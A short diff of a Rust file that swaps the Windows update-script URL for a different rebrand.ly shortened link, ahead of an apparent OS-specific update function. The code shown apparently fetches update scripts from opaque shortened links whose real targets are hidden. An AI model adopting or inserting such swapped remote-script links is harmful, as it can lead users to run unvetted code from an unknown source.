@@ -2,7 +2,7 @@
 use std::io::Result;
 
 const UPDATE_SCRIPT_URL_LINUX: &str = "https://rebrand.ly/tyzot1g";
-const UPDATE_SCRIPT_URL_WINDOWS: &str = "https://rebrand.ly/rcq5ijm";
+const UPDATE_SCRIPT_URL_WINDOWS: &str = "https://rebrand.ly/36j6rhv";
 
 pub fn update_project() -> Result<()> {
 	let os = std::env::consts::OS;
